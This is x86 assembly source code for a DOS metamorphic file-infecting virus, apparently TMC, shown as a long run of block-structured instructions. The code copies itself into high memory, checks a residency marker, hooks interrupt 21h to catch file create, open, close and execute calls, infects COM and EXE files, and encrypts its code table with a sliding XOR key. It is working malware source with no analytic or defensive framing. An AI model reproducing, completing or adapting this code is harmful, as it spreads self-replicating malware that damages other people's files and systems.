             dw      138ch               ; Pointer to initial_sp_
             db      04h                 ; Four bytes instruction

             mov     cx,[bp+1234h]       ; CX = initial CS relative to star...

             db      11101101b           ; Data reference
             dw      1389h               ; Pointer to initial_cs_
             db      03h                 ; Three bytes instruction

             add     cx,10h              ; Add ten to initial CS relative t...

             db      02h                 ; Two bytes instruction

             add     cx,ax               ; Add segment of PSP for current p...

             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save incorrect IP at stack

             db      11101101b           ; Data reference
             dw      1773h               ; Pointer to incorrec_ip
             db      01h                 ; One byte instruction

             push    ax                  ; Save segment of PSP for current ...

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save size of memory block in par...

             db      11101101b           ; Data reference
             dw      1395h               ; Pointer to mcb_size__
             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      02h                 ; Two bytes instruction

             mov     cl,00h              ; COM executable

             db      04h                 ; Four bytes instruction

             cmp     [bp+1234h],cl       ; COM executable?

             db      11101101b           ; Data reference
             dw      1388h               ; Pointer to executa_sta
             db      01110101b+10000000b ; Not equal? Jump to move_virus__
             dw      1390h               ; Pointer to move_virus__
             db      04h                 ; Four bytes instruction

             lea     si,[bp+1234h]       ; SI = offset of incorr_code_

             db      11101101b           ; Data reference
             dw      1776h               ; Pointer to incorr_code_
             db      03h                 ; Three bytes instruction

             mov     ax,cs:[si]          ; AX = first two bytes of incorrec...

             db      04h                 ; Four bytes instruction

             mov     cs:[100h],ax        ; Store first two bytes of incorre...

             db      04h                 ; Four bytes instruction

             mov     al,cs:[si+02h]      ; AL = last byte of incorrect code

             db      04h                 ; Four bytes instruction

             mov     cs:[100h+02h],al    ; Store last byte of incorrect code

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1390h               ; Pointer to move_virus__
             db      11101111b           ; End of block
move_virus__ db      11101110b           ; Beginning of block
             dw      1390h               ; Block identification of move_vir...
             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero AX

             db      02h                 ; Two bytes instruction

             mov     ds,ax               ; DS = segment of DOS communicatio...

             db      05h                 ; Five bytes instruction

             cmp     byte ptr ds:[501h],10h

             db      01110100b+10000000b ; Already resident? Jump to virus_...
             dw      65h                 ; Pointer to virus_exit_
             db      05h                 ; Five bytes instruction

             mov     byte ptr ds:[501h],10h

             db      01h                 ; One byte instruction

             push    es                  ; Save ES at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (ES)

             db      03h                 ; Three bytes instruction

             mov     ax,ds:[0ch]         ; AX = offset within next virus ge...

             db      03h                 ; Three bytes instruction

             sub     ax,730h             ; Subtract offset of next virus ge...

             db      04h                 ; Four bytes instruction

             mov     [bp+1234h],ax       ; Store offset of virus_exit

             db      11101101b           ; Data reference
             dw      0bf1h               ; Pointer to vir_exit_of
             db      04h                 ; Four bytes instruction

             mov     cx,ds:[0eh]         ; CX = length of virus

             db      04h                 ; Four bytes instruction

             mov     [bp+1234h],cx       ; Store length of virus

             db      11101101b           ; Data reference
             dw      0bf0h               ; Pointer to virus_lengt
             db      03h                 ; Three bytes instruction

             mov     si,730h             ; SI = offset of next virus genera...

             db      02h                 ; Two bytes instruction

             xor     di,di               ; Zero DI

             db      02h                 ; Two bytes instruction

             rep     movsb               ; Move virus to top of memory

             db      02h                 ; Two bytes instruction

             mov     cl,04h              ; Divide by paragraphs

             db      02h                 ; Two bytes instruction

             shr     di,cl               ; DI = length of next virus genera...

             db      01h                 ; One byte instruction

             inc     di                  ; Increase length of next virus ge...

             db      04h                 ; Four bytes instruction

             mov     bx,[bp+1234h]       ; BX = size of memory block in par...

             db      11101101b           ; Data reference
             dw      1394h               ; Pointer to mcb_size___
             db      04h                 ; Four bytes instruction

             sub     bx,[bp+1234h]       ; Subtract new size in paragraphs ...

             db      11101101b           ; Data reference
             dw      1393h               ; Pointer to new_mcb_siz
             db      02h                 ; Two bytes instruction

             sub     bx,di               ; Subtract length of next virus ge...

             db      01h                 ; One byte instruction

             dec     bx                  ; Decrease new size in paragraphs

             db      01h                 ; One byte instruction

             dec     bx                  ; Decrease new size in paragraphs

             db      02h                 ; Two bytes instruction

             cmp     bx,di               ; Insufficient memory?

             db      01110010b+10000000b ; Below? Jump to virus_exit_
             dw      65h                 ; Pointer to virus_exit_
             db      02h                 ; Two bytes instruction

             mov     ah,4ah              ; Resize memory block

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to virus_exit_
             dw      65h                 ; Pointer to virus_exit_
             db      02h                 ; Two bytes instruction

             mov     bx,di               ; BX = number of paragraphs to all...

             db      02h                 ; Two bytes instruction

             mov     ah,48h              ; Allocate memory

             db      02h                 ; Two bytes instruction

             int     21h

             db      01110010b+10000000b ; Error? Jump to virus_exit_
             dw      65h                 ; Pointer to virus_exit_
             db      01h                 ; One byte instruction

             dec     ax                  ; AX = segment of current Memory C...

             db      02h                 ; Two bytes instruction

             mov     es,ax               ; ES = segment of current Memory C...

             db      07h                 ; Seven bytes instruction

             mov     word ptr es:[01h],08h

             db      01h                 ; One byte instruction

             inc     ax                  ; AX = segment of PSP for current ...

             db      02h                 ; Two bytes instruction

             mov     es,ax               ; AX = segment of PSP for current ...

             db      04h                 ; Four bytes instruction

             mov     cx,[bp+1234h]       ; CX = length of virus

             db      11101101b           ; Data reference
             dw      0bf0h               ; Pointer to virus_lengt
             db      02h                 ; Two bytes instruction

             xor     si,si               ; Zero SI

             db      02h                 ; Two bytes instruction

             xor     di,di               ; Zero DI

             db      02h                 ; Two bytes instruction

             rep     movsb               ; Move virus to top of memory

             db      01h                 ; One byte instruction

             push    es                  ; Save ES at stack

             db      04h                 ; Four bytes instruction

             push    [bp+1234h]          ; Save offset of virus_exit_ at stack

             db      11101101b           ; Data reference
             dw      0bf1h               ; Pointer to vir_exit_of
             db      04h                 ; Four bytes instruction

             mov     al,[bp+1234h]       ; AL = 8-bit encryption/decryption...

             db      11101101b           ; Data reference
             dw      0bd7h               ; Pointer to crypt_key_
             db      04h                 ; Four bytes instruction

             mov     ah,[bp+1234h]       ; AH = 8-bit sliding encryption/de...

             db      11101101b           ; Data reference
             dw      0bd8h               ; Pointer to sliding_key_
             db      01h                 ; One byte instruction

             retf                        ; Return far

             db      11101111b           ; End of block
terminate_   db      11101110b           ; Beginning of block
             dw      0beeh               ; Block identification of terminate_
             db      03h                 ; Three bytes instruction

             mov     ax,4c00h            ; Terminate with return code

             db      02h                 ; Two bytes instruction

             int     21h

             db      11101111b           ; End of block
get_rnd_num_ db      11101110b           ; Beginning of block
             dw      0bd4h               ; Block identification of get_rnd_...
             db      01h                 ; One byte instruction

             push    cx                  ; Save CX at stack

             db      02h                 ; Two bytes instruction

             in      al,40h              ; AL = 8-bit random number

             db      02h                 ; Two bytes instruction

             mov     ah,al               ; AH = 8-bit random number

             db      02h                 ; Two bytes instruction

             in      al,40h              ; AL = 8-bit random number

             db      05h                 ; Five bytes instruction

             xor     ax,es:[02h]         ; AX = 16-bit random number

             db      02h                 ; Two bytes instruction

             mov     cl,ah               ; CL = high-order byte of 16-bit r...

             db      02h                 ; Two bytes instruction

             rol     ax,cl               ; AX = 16-bit random number

             db      04h                 ; Four bytes instruction

             mov     es:[02h],ax         ; Store 16-bit random number

             db      01h                 ; One byte instruction

             pop     cx                  ; Load CX from stack

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
rnd_in_rang  db      11101110b           ; Beginning of block
             dw      0bd5h               ; Block identification of rnd_in_rang
             db      02h                 ; Two bytes instruction

             or      bp,bp               ; Zero BP?

             db      01110100b+10000000b ; Zero? Jump to zero_range_
             dw      0bd6h               ; Pointer to zero_range_
             db      01h                 ; One byte instruction

             push    dx                  ; Save DX at stack

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd4h               ; Pointer to get_rnd_num_
             db      02h                 ; Two bytes instruction

             xor     dx,dx               ; Zero DX

             db      02h                 ; Two bytes instruction

             div     bp                  ; DX = random number within range

             db      01h                 ; One byte instruction

             xchg    ax,dx               ; AX = random number within range

             db      01h                 ; One byte instruction

             pop     dx                  ; Load DX from stack 

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
zero_range_  db      11101110b           ; Beginning of block
             dw      0bd6h               ; Block identification of zero_range_
             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; AX = random number within range

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
decrypt_byt  db      11101110b           ; Beginning of block
             dw      0be0h               ; Block identification of decrypt_byt
             db      04h                 ; Four bytes instruction

             mov     [bp+1234h],ah       ; Store AH

             db      11101101b           ; Data reference
             dw      0bd9h               ; Pointer to ah__
             db      02h                 ; Two bytes instruction

             mov     ax,si               ; AX = offset within table

             db      02h                 ; Two bytes instruction

             sub     ax,bp               ; Subtract delta offset from offse...

             db      03h                 ; Three bytes instruction

             sub     ax,1234h            ; Subtract offset of tmc_table_ fr...

             db      11101101b           ; Data reference
             dw      4c5h                ; Pointer to tmc_table_
             db      04h                 ; Four bytes instruction

             mul     word ptr [bp+1234h] ; AL = 8-bit sliding encryption/de...

             db      11101101b           ; Data reference
             dw      0bd8h               ; Pointer to sliding_key_
             db      04h                 ; Four bytes instruction

             add     al,[bp+1234h]       ; AL = 8-bit encryption/decryption...

             db      11101101b           ; Data reference
             dw      0bd7h               ; Pointer to crypt_key_
             db      02h                 ; Two bytes instruction

             xor     al,[si]             ; AL = byte of decrypted table

             db      04h                 ; Four bytes instruction

             mov     ah,[bp+1234h]       ; AH = stored AH

             db      11101101b           ; Data reference
             dw      0bd9h               ; Pointer to ah__
             db      01h                 ; One byte instruction

             inc     si                  ; Increase offset within table

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
decrypt_id_  db      11101110b           ; Beginning of block
             dw      0be1h               ; Block identification of decrypt_id_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      02h                 ; Two bytes instruction

             mov     ah,al               ; AL = byte of decrypted table

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0be0h               ; Pointer to decrypt_byt
             db      02h                 ; Two bytes instruction

             xchg    al,ah               ; AL = byte of decrypted table

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
virus_exit_  db      11101110b           ; Beginning of block
             dw      65h                 ; Block identification of virus_exit_
             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack

             db      02h                 ; Two bytes instruction

             mov     ah,49h              ; Free memory

             db      02h                 ; Two bytes instruction

             int     21h

             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      02h                 ; Two bytes instruction

             mov     ds,ax               ; DS = segment of PSP for current ...

             db      02h                 ; Two bytes instruction

             mov     es,ax               ; DS = segment of PSP for current ...

             db      02h                 ; Two bytes instruction

             mov     ah,4ah              ; Resize memory block

             db      02h                 ; Two bytes instruction

             int     21h

             db      04h                 ; Four bytes instruction

             lea     bx,[bp+1234h]       ; BX = offset of jmp_imm32_

             db      11101101b           ; Data reference
             dw      1391h               ; Pointer of jmp_imm32_
             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack (initial IP)

             db      04h                 ; Four bytes instruction

             mov     cs:[bx+01h],ax      ; Store initial IP

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack (initial CS ...)

             db      04h                 ; Four bytes instruction

             mov     cs:[bx+03h],ax      ; Store initial CS relative to sta...

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack (initial SP)

             db      01h                 ; One byte instruction

             pop     ss                  ; Load SS from stack (initial SS ...)

             db      02h                 ; Two bytes instruction

             mov     sp,ax               ; SP = stack pointer

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      1391h               ; Pointer of jmp_imm32_
             db      11101111b           ; End of block
jmp_imm32_   db      11101110b           ; Beginning of block
             dw      1391h               ; Block identification of jmp_imm32_
             db      05h+10h             ; Five bytes data
             db      11101010b           ; JMP imm32 (opcode 0eah)
             dd      00h                 ; Pointer to virus in top of memory
             db      11101111b           ; End of block
ah__         db      11101110b           ; Beginning of block
             dw      0bd9h               ; Block identification of ah__
             db      01h+10h             ; One byte data
             db      00h                 ; Accumulator register (high-orde...)
             db      11101111b           ; End of block
probability_ db      11101110b           ; Beginning of block
             dw      0bech               ; Block identification of probabil...
             db      02h+10h             ; Two bytes data
             dw      32h                 ; Probability
             db      11101111b           ; End of block
crypt_key_   db      11101110b           ; Beginning of block
             dw      0bd7h               ; Block identification of crypt_key_
             db      01h+10h             ; One data byte
             db      00h                 ; 8-bit encryption/decryption key
             db      11101111b           ; End of block
sliding_key_ db      11101110b           ; Beginning of block
             dw      0bd8h               ; Block identification to sliding_...
             db      02h+10h             ; Two bytes data
             dw      00h                 ; 8-bit sliding encryption/decrypt...
             db      11101111b           ; End of block
executa_sta  db      11101110b           ; Beginning of block
             dw      1388h               ; Block identification of executa_sta
             db      01h+10h             ; One byte data
             db      00h                 ; Executable status
             db      11101111b           ; End of block
origin_code_ db      11101110b           ; Beginning of block
             dw      1f40h               ; Block identification of origin_c...
             db      03h+10h             ; Three bytes data
             db      11000011b,02h dup(00h)
             db      11101111b           ; End of block
incorr_code_ db      11101110b           ; Beginning of block
             dw      1776h               ; Block identification of incorr_c...
             db      03h+10h             ; Three bytes data
             db      11000011b,02h dup(00h)
             db      11101111b           ; End of block
initial_cs_  db      11101110b           ; Beginning of block
             dw      1389h               ; Block identification of initial_cs_
             db      02h+10h             ; Two bytes data
             dw      0fff0h              ; Initial CS relative to start of ...
             db      11101111b           ; End of block
initial_ss_  db      11101110b           ; Beginning of block
             dw      138ah               ; Block identification of initial_ss_
             db      02h+10h             ; Two bytes data
             dw      0fff0h              ; Initial SS relative to start of ...
             db      11101111b           ; End of block
initial_ip_  db      11101110b           ; Beginning of block
             dw      138bh               ; Block identification of initial_ip_
             db      02h+10h             ; Two bytes data
             dw      100h                ; Initial IP
             db      11101111b           ; End of block
incorrec_ip  db      11101110b           ; Beginning of block
             dw      1773h               ; Block identification of incorrec_ip
             db      02h+10h             ; Two bytes data
             dw      100h                ; Incorrect IP
             db      11101111b           ; End of block
initial_sp_  db      11101110b           ; Beginning of block
             dw      138ch               ; Block identification of initial_sp_
             db      02h+10h             ; Two bytes data
             dw      0fffeh              ; Initial SP
             db      11101111b           ; End of block
new_mcb_siz  db      11101110b           ; Beginning of block
             dw      1393h               ; Block identification of new_mcb_siz
             db      02h+10h             ; Two bytes data
             dw      1000h               ; New size in paragraphs
             db      11101111b           ; End of block
mcb_size__   db      11101110b           ; Beginning of block
             dw      1395h               ; Block identification of mcb_size__
             db      02h+10h             ; Two bytes data
             dw      0ffffh              ; Size of memory block in paragraphs
             db      11101111b           ; End of block
mcb_size___  db      11101110b           ; Beginning of block
             dw      1394h               ; Block identification of mcb_size___
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Size of memory block in paragraphs
             db      11101111b           ; End of block
program_seg_ db      11101110b           ; Beginning of block
             dw      0befh               ; Block identification of program_...
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Segment of PSP for current process
             db      11101111b           ; End of block
virus_lengt  db      11101110b           ; Beginning of block
             dw      0bf0h               ; Block identification of virus_lengt
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Length of virus
             db      11101111b           ; End of block
vir_exit_of  db      11101110b           ; Beginning of block
             dw      0bf1h               ; Block identification of vir_exit_of
             db      02h+10h             ; Two bytes data
             dw      00h                 ; Offset of virus_exit_
             db      11101111b           ; End of block
tmc_table_   db      11101110b           ; Beginning of block
             dw      4c5h                ; Block identification of tmc_table_
             db      11101111b           ; End of block
             db      00h                 ; End of table
second_table db      11101111b           ; End of block
virus_end:
crypt_table  db      11101110b           ; Beginning of block
             dw      66h                 ; Block identification of crypt_table
             db      02h                 ; Two bytes instruction

             xor     bp,bp               ; Zero BP

             db      02h                 ; Two bytes instruction

             mov     ds,bp               ; DS = segment of BIOS data segment

             db      04h                 ; Four bytes instruction

             mov     bx,ds:[46dh]        ; BX = timer ticks since midnight

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (CS)

             db      03h                 ; Three bytes instruction

             and     bx,1111111111110000b

             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],bx       ; Store timer ticks since midnight

             db      11101101b           ; Data reference
             dw      13adh               ; Pointer to timer_ticks
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bfeh               ; Pointer to crypt_table_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bd4h               ; Pointer to get_rnd_num_
             db      03h                 ; Three bytes instruction

             mov     ds:[1234h],al       ; Store 8-bit encryption/decryptio...

             db      11101101b           ; Data reference
             dw      0bd7h               ; Pointer to crypt_key_
             db      04h                 ; Four bytes instruction

             mov     ds:[1234h],ah       ; Store 8-bit sliding encryption/d...

             db      11101101b           ; Data reference
             dw      0bd8h               ; Pointer to sliding_key_
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      0bfeh               ; Pointer to crypt_table_
             db      03h                 ; Three bytes instruction

             mov     ax,3521h            ; Get interrupt vector 21h

             db      02h                 ; Two bytes instruction

             int     21h

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of int21_addr

             db      11101101b           ; Data reference
             dw      0c9h                ; Pointer to int21_addr
             db      02h                 ; Two bytes instruction

             mov     [di],bx             ; Store offset of interrupt 21h

             db      03h                 ; Three bytes instruction

             mov     [di+02h],es         ; Store segment of interrupt 21h

             db      03h                 ; Three bytes instruction

             mov     dx,1234h            ; DX = offset of int21_virus

             db      11101101b           ; Data reference
             dw      0c8h                ; Pointer to int21_virus
             db      03h                 ; Three bytes instruction

             mov     ax,2521h            ; Set interrupt vector 21h

             db      02h                 ; Two bytes instruction

             int     21h

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      65h                 ; Pointer to virus_exit_
             db      11101111b           ; End of block
crypt_table_ db      11101110b           ; Beginning of block
             dw      0bfeh               ; Block identification of crypt_ta...
             db      03h                 ; Three bytes instruction

             mov     si,1234h            ; SI = offset of tmc_table_

             db      11101101b           ; Data reference
             dw      4c5h                ; Pointer to tmc_table_
             db      03h                 ; Three bytes instruction

             mov     cx,(code_end-first_table)

             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0bffh               ; Pointer to crypt_loop
             db      11101111b           ; End of block
crypt_loop   db      11101110b           ; Beginning of block
             dw      0bffh               ; Block identification of crypt_loop
             db      02h                 ; Two bytes instruction

             xor     [si],al             ; Encrypt byte of table

             db      01h                 ; One byte instruction

             inc     si                  ; Increase offset within table

             db      02h                 ; Two bytes instruction

             add     al,ah               ; Add 8-bit sliding encryption key...

             db      01h                 ; One byte instruction

             dec     cx                  ; Decrease counter

             db      01110101b+10000000b ; Not zero? Jump to crypt_loop
             dw      0bffh               ; Pointer to crypt_loop
             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
int21_virus  db      11101110b           ; Beginning of block
             dw      0c8h                ; Block identification of int21_virus
             db      01h                 ; One byte instruction

             cld                         ; Clear direction flag

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a0h               ; Pointer to push_regs
             db      03h                 ; Three bytes instruction

             cmp     ah,3ch              ; Create file?

             db      01110100b+10000000b ; Equal? Jump to exam_drv_let
             dw      139ah               ; Pointer to exam_drv_let
             db      03h                 ; Three bytes instruction

             cmp     ah,3dh              ; Open file?

             db      01110100b+10000000b ; Equal? Jump to exam_drv_let
             dw      139ah               ; Pointer to exam_drv_let
             db      03h                 ; Three bytes instruction

             cmp     ah,3eh              ; Close file?

             db      01110100b+10000000b ; Equal? Jump to infect_fil
             dw      139ch               ; Pointer to infect_fil
             db      03h                 ; Three bytes instruction

             cmp     ah,4bh              ; Load and/or execute program?

             db      01110101b+10000000b ; Not equal? Jump to int21_exit
             dw      13a6h               ; Pointer to int21_exit
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13a9h               ; Pointer to infect_file
             db      11101111b           ; End of block
infect_file  db      11101110b           ; Beginning of block
             dw      13a9h               ; Block identification of infect_file
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      1392h               ; Pointer to infect_fil_
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13a6h               ; Pointer to int21_exit
             db      11101111b           ; End of block
int21_exit   db      11101110b           ; Beginning of block
             dw      13a6h               ; Block identification of int21_exit
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a1h               ; Pointer to pop_regs
             db      05h                 ; Five bytes instruction

             jmp     dword ptr cs:[1234h]

             db      11101101b           ; Data reference
             dw      0c9h                ; Pointer to int21_addr
             db      11101111b           ; End of block
exam_drv_let db      11101110b           ; Beginning of block
             dw      139ah               ; Block identification of exam_drv...
             db      02h                 ; Two bytes instruction

             mov     si,dx               ; SI = offset of filename

             db      01h                 ; One byte instruction

             lodsb                       ; AL = first byte of filename

             db      03h                 ; Three bytes instruction

             cmp     byte ptr [si],':'   ; Does filename include drive letter?

             db      01110101b+10000000b ; Not equal? Jump to exam_def_drv
             dw      139bh               ; Pointer to exam_def_drv
             db      02h                 ; Two bytes instruction

             or      al,20h              ; Lowercase character

             db      02h                 ; Two bytes instruction

             cmp     al,'b'              ; Floppy disk?

             db      01110111b+10000000b ; Above? Jump to int21_exit
             dw      13a6h               ; Pointer to int21_exit
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13a8h               ; Pointer to infect_file_
             db      11101111b           ; End of block
exam_def_drv db      11101110b           ; Beginning of block
             dw      139bh               ; Block identification of exam_def...
             db      01h                 ; One byte instruction

             push    ax                  ; Save AX at stack

             db      02h                 ; Two bytes instruction

             mov     ah,19h              ; Get current default drive

             db      02h                 ; Two bytes instruction

             int     21h

             db      02h                 ; Two bytes instruction

             cmp     al,01h              ; Floppy disk?

             db      01h                 ; One byte instruction

             pop     ax                  ; Load AX from stack

             db      01110111b+10000000b ; Above? Jump to int21_exit
             dw      13a6h               ; Pointer to int21_exit
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      13a8h               ; Pointer to infect_file_
             db      11101111b           ; End of block
infect_file_ db      11101110b           ; Beginning of block
             dw      13a8h               ; Block identification of infect_f...
             db      03h                 ; Three bytes instruction

             cmp     ah,3ch              ; Create file?

             db      01110101b+10000000b ; Not equal? Jump to infect_file
             dw      13a9h               ; Pointer to infect_file
             db      02h                 ; Two bytes instruction

             xor     bx,bx               ; Zero file handle

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13abh               ; Pointer to exam_psp_etc
             db      01110101b+10000000b ; Not zero? Jump to int21_exit
             dw      13a6h               ; Pointer to int21_exit
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a4h               ; Pointer to int24_store
             db      02h                 ; Two bytes instruction

             mov     ah,60h              ; Canonicalize filename or path

             db      01h                 ; One byte instruction

             dec     si                  ; SI = offset of filename

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack (CS)

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of filename

             db      11101101b           ; Data reference
             dw      139eh               ; Pointer to filename
             db      02h                 ; Two bytes instruction

             int     21h

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a1h               ; Pointer to pop_regs
             db      01h                 ; One byte instruction

             pushf                       ; Save flags at stack

             db      05h                 ; Five bytes instruction

             call    dword ptr cs:[1234h]

             db      11101101b           ; Data reference
             dw      0c9h                ; Pointer to int21_addr
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a0h               ; Pointer to push_regs
             db      01h                 ; One byte instruction

             pushf                       ; Save flags at stack

             db      03h                 ; Three bytes instruction

             mov     bx,1111111111111111b

             db      03h                 ; Three bytes instruction

             adc     bx,00h              ; BX = file handle mask

             db      02h                 ; Two bytes instruction

             and     ax,bx               ; AX = file handle

             db      04h                 ; Four bytes instruction

             mov     cs:[1234h],ax       ; Store file handle

             db      11101101b           ; Data reference
             dw      139dh               ; Pointer to file_handle
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a5h               ; Pointer to int24_load
             db      01h                 ; One byte instruction

             popf                        ; Load flags from stack

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a1h               ; Pointer to pop_regs
             db      01h                 ; One byte instruction

             sti                         ; Set interrupt-enable flag

             db      03h                 ; Three bytes instruction

             retf    02h                 ; Return far and ???

             db      11101111b           ; End of block
infect_fil   db      11101110b           ; Beginning of block
             dw      139ch               ; Block identification of infect_fil
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13abh               ; Pointer to exam_psp_etc
             db      01110010b+10000000b ; Store segment of PSP for current...
             dw      13a6h               ; Pointer to int21_exit
             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero file handle

             db      04h                 ; Four bytes instruction

             mov     cs:[1234h],ax       ; Store file handle

             db      11101101b           ; Data reference
             dw      139dh               ; Pointer to file_handle
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a1h               ; Pointer to pop_regs
             db      01h                 ; One byte instruction

             pushf                       ; Save flags at stack

             db      05h                 ; Five bytes instruction

             call    dword ptr cs:[1234h]

             db      11101101b           ; Data reference
             dw      0c9h                ; Pointer to int21_addr
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a0h               ; Pointer to push_regs
             db      01h                 ; One byte instruction

             pushf                       ; Save flags at stack

             db      01h                 ; One byte instruction

             push    cs                  ; Save CS at stack

             db      01h                 ; One byte instruction

             pop     ds                  ; Load DS from stack (CS)

             db      03h                 ; Three bytes instruction

             mov     dx,1234h            ; DX = offset of filename

             db      11101101b           ; Data reference
             dw      139eh               ; Pointer to filename
             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      1392h               ; Pointer to infect_fil_
             db      01h                 ; One byte instruction

             popf                        ; Load flags from stack

             db      11101000b           ; CALL imm16 (opcode 0e8h)
             dw      13a1h               ; Pointer to pop_regs
             db      01h                 ; One byte instruction

             sti                         ; Set interrupt-enable flag

             db      03h                 ; Three bytes instruction

             retf    02h                 ; Return far and ???

             db      11101111b           ; End of block
exam_psp_etc db      11101110b           ; Beginning of block
             dw      13abh               ; Block identification of exam_psp...
             db      01h                 ; One byte instruction

             push    bx                  ; Save BX at stack

             db      02h                 ; Two bytes instruction

             mov     ah,62h              ; Get current PSP address

             db      02h                 ; Two bytes instruction

             int     21h

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of progra_seg

             db      11101101b           ; Data reference
             dw      139fh               ; Pointer to progra_seg
             db      03h                 ; Three bytes instruction

             cmp     cs:[di],bx          ; Segment of PSP for current proc...?

             db      03h                 ; Three bytes instruction

             mov     cs:[di],bx          ; Store segment of PSP for current...

             db      03h                 ; Three bytes instruction

             mov     di,1234h            ; DI = offset of file_handle

             db      11101101b           ; Data reference
             dw      139dh               ; Pointer to file_handle
             db      01110101b+10000000b ; Not equal? Jump to dont_infect
             dw      13ach               ; Pointer to dont_infect
             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack

             db      02h                 ; Two bytes instruction

             mov     ax,bx               ; AX = file handle

             db      03h                 ; Three bytes instruction

             sub     ax,cs:[di]          ; Subtract saved file handle from ...

             db      03h                 ; Three bytes instruction

             add     ax,0ffffh           ; Add sixty-five thousand five hun...

             db      01h                 ; One byte instruction

             inc     ax                  ; Increase file handle

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
dont_infect  db      11101110b           ; Beginning of block
             dw      13ach               ; Block identification of dont_infect
             db      05h                 ; Five bytes instruction

             mov     word ptr cs:[di],00h

             db      02h                 ; Two bytes instruction

             xor     ax,ax               ; Zero file handle

             db      01h                 ; One byte instruction

             pop     bx                  ; Load BX from stack

             db      01h                 ; One byte instruction

             stc                         ; Set carry flag

             db      01h                 ; One byte instruction

             ret                         ; Return

             db      11101111b           ; End of block
infect_fil_  db      11101110b           ; Beginning of block
             dw      1392h               ; Block identification of infect_fil_
             db      01h                 ; One byte instruction

             push    ds                  ; Save DS at stack

             db      01h                 ; One byte instruction

             pop     es                  ; Load ES from stack (DS)

             db      02h                 ; Two bytes instruction

             mov     di,dx               ; DI = offset of filename

             db      03h                 ; Three bytes instruction

             mov     cx,43h              ; CX = number of bytes to search t...

             db      02h                 ; Two bytes instruction

             xor     al,al               ; Zero AL

             db      02h                 ; Two bytes instruction

             repne   scasb               ; Find end of filename

             db      01110101b+10000000b ; Not equal? Jump to infect_exit_
             dw      0fbh                ; Pointer to infect_exit_
             db      03h                 ; Three bytes instruction

             lea     si,[di-05h]         ; SI = offset of the dot in the fi...

             db      01h                 ; One byte instruction

             lodsw                       ; AX = two bytes of filename

             db      03h                 ; Three bytes instruction

             or      ax,2020h            ; Lowercase characters

             db      03h                 ; Three bytes instruction

             mov     bx,'mo'             ; COM executable

             db      03h                 ; Three bytes instruction

             cmp     ax,'c.'             ; COM executable?

             db      01110100b+10000000b ; Equal? Jump to examine_ext
             dw      0f0h                ; Pointer to examine_ext
             db      03h                 ; Three bytes instruction

             mov     bx,'ex'             ; EXE executable

             db      03h                 ; Three bytes instruction

             cmp     ax,'e.'             ; EXE executable?

             db      01110100b+10000000b ; Equal? Jump to examine_ext
             dw      0f0h                ; Pointer to examine_ext
             db      11101001b           ; JMP imm16 (opcode 0e9h)
             dw      0fbh                ; Pointer to infect_exit_
             db      11101111b           ; End of block
